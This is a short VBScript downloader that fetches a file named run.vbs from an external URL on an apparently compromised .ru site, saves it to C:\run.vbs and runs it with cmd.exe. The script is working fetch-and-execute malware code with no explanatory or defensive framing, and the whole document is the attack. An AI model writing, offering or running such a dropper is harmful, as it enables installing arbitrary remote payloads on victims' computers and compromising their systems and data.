dim http_obj
dim stream_obj
dim shell_obj
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
set shell_obj = CreateObject("WScript.Shell")
URL = "http://nbmag.ru/skin/adminhtml/default/default/lib/run.vbs" 'Where to download the file from
FILENAME = "C:\run.vbs" 'Name to save the file (on the local system)
RUNCMD = "C:\run.vbs cmd.exe" 'Command to run after downloading
http_obj.open "GET", URL, False
http_obj.send
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2
shell_obj.run RUNCMD